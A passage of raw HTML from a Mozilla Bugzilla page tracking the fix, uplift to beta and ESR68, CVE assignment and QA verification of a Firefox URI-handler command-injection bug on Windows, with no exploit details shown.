        Flags: <span class="activity-deleted">approval-mozilla-beta?</span></div><div class="change">
        <a href="/attachment.cgi?id=9086057&amp;action=edit"
           title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!"
           class=""
        >Attachment #9086057</a> -
        Flags: approval-mozilla-beta+</div></div></div><div class="change-set" id="a1017204_75935"><div class="change" id="aa1017204_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a1017204_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a1017204_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1017204_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1017204_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a1017204_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 07:15 PDT" data-time="1566396942">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9086547&amp;action=edit"
           title="Bug 1572838 - stop processing osint in BrowserContentHandler.jsm, r?dveditz,Mossop"
           class=""
        >Attachment #9086547</a> -
        Flags: <span class="activity-deleted">approval-mozilla-esr68?</span></div><div class="change">
        <a href="/attachment.cgi?id=9086547&amp;action=edit"
           title="Bug 1572838 - stop processing osint in BrowserContentHandler.jsm, r?dveditz,Mossop"
           class=""
        >Attachment #9086547</a> -
        Flags: approval-mozilla-esr68+</div><div class="change">
        <a href="/attachment.cgi?id=9086547&amp;action=edit"
           title="Bug 1572838 - stop processing osint in BrowserContentHandler.jsm, r?dveditz,Mossop"
           class=""
        >Attachment #9086547</a> -
        Flags: <span class="activity-deleted">approval-mozilla-beta?</span></div><div class="change">
        <a href="/attachment.cgi?id=9086547&amp;action=edit"
           title="Bug 1572838 - stop processing osint in BrowserContentHandler.jsm, r?dveditz,Mossop"
           class=""
        >Attachment #9086547</a> -
        Flags: approval-mozilla-beta+</div></div></div><div class="change-set" id="c36"><div class="comment" data-id="14313740" data-no="36"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-36" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_7313" id="a1017204_75935"><img src="https://secure.gravatar.com/avatar/dc84c7d304a23e0a62a86580dd08c587?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_7313" id="a1017204_75935"><a class="email " href="/user_profile?user_id=7313" > <span class="fna">Mike Kaply [:mkaply]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-36"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-36" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c36">Comment 36</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 08:09 PDT" data-time="1566400140">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-36">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-36" data-comment-id="14313740" data-ismarkdown="true" ><p>(In reply to :Gijs (he/him) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c34" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #34</a>)</p>
<blockquote>
<p>Mike, I don&#39;t suppose you have an inkling of whether enterprise users are likely to mess with our registry entries that would be used by Windows to deal with URLs from other apps?</p>
</blockquote>
<p>I&#39;ve never heard of folks doing this and it seem like a terrible idea. Not something we should worry about.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(mozilla)</span></div></div></div><div class="change-set" id="c37"><div class="comment" data-id="14314271" data-no="37"
       data-tags="uplift">
    
    <table class="layout-table change-head " id="ch-37" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a1017204_75935"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a1017204_75935"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-37"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-37" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c37">Comment 37</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 11:57 PDT" data-time="1566413843">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-37">
        <td colspan="2" class="comment-tags"><span class="comment-tag">uplift</span>
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-37" data-comment-id="14314271" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/releases/mozilla-beta/rev/20eaff20dec0" rel="nofollow">https://hg.mozilla.org/releases/mozilla-beta/rev/20eaff20dec0</a><br>
<a href="https://hg.mozilla.org/releases/mozilla-beta/rev/57bee2306211" rel="nofollow">https://hg.mozilla.org/releases/mozilla-beta/rev/57bee2306211</a></p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=isnotempty">status-firefox69</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="c38"><div class="comment" data-id="14314872" data-no="38"
       data-tags="uplift">
    
    <table class="layout-table change-head " id="ch-38" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a1017204_75935"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a1017204_75935"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-38"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-38" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c38">Comment 38</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 16:30 PDT" data-time="1566430211">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-38">
        <td colspan="2" class="comment-tags"><span class="comment-tag">uplift</span>
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-38" data-comment-id="14314872" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/releases/mozilla-esr68/rev/01f6b1c6b4dc" rel="nofollow">https://hg.mozilla.org/releases/mozilla-esr68/rev/01f6b1c6b4dc</a><br>
<a href="https://hg.mozilla.org/releases/mozilla-esr68/rev/8b4ed9c4a3cb" rel="nofollow">https://hg.mozilla.org/releases/mozilla-esr68/rev/8b4ed9c4a3cb</a></p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=isnotempty">status-firefox-esr68</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="a1053094_280903"><div class="change" id="aa1053094_280903">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a1053094_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a1053094_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1053094_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1053094_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a1053094_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 17:13 PDT" data-time="1566432832">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Alias: CVE-2019-11751</div><div class="change">Whiteboard: [adv-main69+][adv-esr68.1+]</div></div></div><div class="change-set" id="a1078804_488993"><div class="change" id="aa1078804_488993">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_488993" id="a1078804_488993"><img src="https://secure.gravatar.com/avatar/42f2a9436bbaefa7e0028e214f2b9350?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_488993" id="a1078804_488993"><a class="email " href="/user_profile?user_id=488993" > <span class="fna">Andrei Vaida [:avaida]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1078804_488993"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1078804_488993">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a1078804_488993">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-22 00:22 PDT" data-time="1566458542">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">QA Whiteboard: [qa-triaged]</div></div></div><div class="change-set" id="a1137394_159069"><div class="change" id="aa1137394_159069">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a1137394_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a1137394_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1137394_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1137394_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a1137394_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-22 16:38 PDT" data-time="1566517132">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Regressions: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED WONTFIX - -osint -private-window no longer works (configured via manually modified registry key so external links open in private windows)"
   href="/show_bug.cgi?id=1575929">1575929</a></div></div></div><div class="change-set" id="c39"><div class="comment" data-id="14322489" data-no="39"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-39" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_616281" id="a1137394_159069"><img src="https://secure.gravatar.com/avatar/290d47e57e18aa40e3f4edb49dbf638c?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_616281" id="a1137394_159069"><a class="email " href="/user_profile?user_id=616281" > <span class="fna">Cristian Fogel [:cfogel]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-39"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-39" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c39">Comment 39</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-26 03:38 PDT" data-time="1566815918">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-39">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-39" data-comment-id="14322489" data-ismarkdown="true" ><p>Managed to reproduce the issue with 68.0.2 as per the video from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c11" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment 11</a> on Windows 10 - version.1809.</p>
<p>Verification scenarios/builds:</p>
<ul>
<li>attempt to open both attachment and the shortcut link with the updated usernames, gmail/.txt files/.pdf files and links appeared to open as expected.</li>
</ul>
<p><strong>with Win 10 - 1809:</strong></p>
<ul>
<li>install over from 68.0.2 - &gt; 69.0b16;</li>
<li>fresh install of nightly(70.0a1 (2019-08-25);</li>
<li>68.1esr(taskCluster).</li>
</ul>
<p><strong>with Win 7 (profesional - version6.1 - build 7601: Service Pack 1)</strong></p>
<ul>
<li>update 69.0b10 -&gt; 69.0b16;</li>
<li>fresh install of nightly(70.0a1 (2019-08-25);</li>
<li>68.1esr(taskCluster).</li>
</ul>
<p>@Gijs if you think that there is something that would need extra attention in this area, would gladly take another look at it.</p>
</div><div class="activity"><div class="change">Status: RESOLVED &rarr; VERIFIED</div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=isnotempty">status-firefox69</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=fixed">fixed</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=verified">verified</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=isnotempty">status-firefox70</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=equals&amp;v1=fixed">fixed</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=equals&amp;v1=verified">verified</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=isnotempty">status-firefox-esr68</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=fixed">fixed</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=verified">verified</a></div><div class="change">Flags: <span class="activity-deleted">qe-verify+</span></div><div class="change">OS: Unspecified &rarr; Windows</div></div></div><div class="change-set" id="a1884168_176914"><div class="change" id="aa1884168_176914">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a1884168_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a1884168_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1884168_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1884168_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a1884168_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-31 08:05 PDT" data-time="1567263906">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Regressions: <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Mailto: links in any browser (Firefox, Chrome, Edge, etc) not launching Thunderbird if configured as default mail client on Windows"
   href="/show_bug.cgi?id=1577706">1577706</a></div></div></div><div class="change-set" id="c40"><div class="comment" data-id="14437170" data-no="40"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-40" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a1884168_176914"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a1884168_176914"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-40"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-40" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c40">Comment 40</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-10-21 07:39 PDT" data-time="1571668750">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-40">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-40" data-comment-id="14437170" data-ismarkdown="true" ><p>I filed <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1590126" title="RESOLVED WORKSFORME">bug 1590126</a> for a follow-up audit, if still deemed necessary (I think it is).</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(fbraun)</span></div></div></div><div class="change-set" id="a25961999_1689"><div class="change" id="aa25961999_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a25961999_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a25961999_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a25961999_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a25961999_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a25961999_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-06-05 00:22 PDT" data-time="1591341737">1 year ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: <span class="activity-deleted">core-security-release</span></div></div></div><div id="new-comment-notice">
          You need to <a href="/show_bug.cgi?id=1572838&amp;GoAheadAndLogIn=1">log in</a>
          before you can comment on or make changes to this bug.
        </div>



<div id="bottom-actions">
  <div id="bottom-right-actions">
    <button type="button" id="top-btn" class="secondary" aria-label="Go to Page Top">Top &uarr;</button>
  </div>
</div></div> 
</main> 
</div> 


</body>
</html>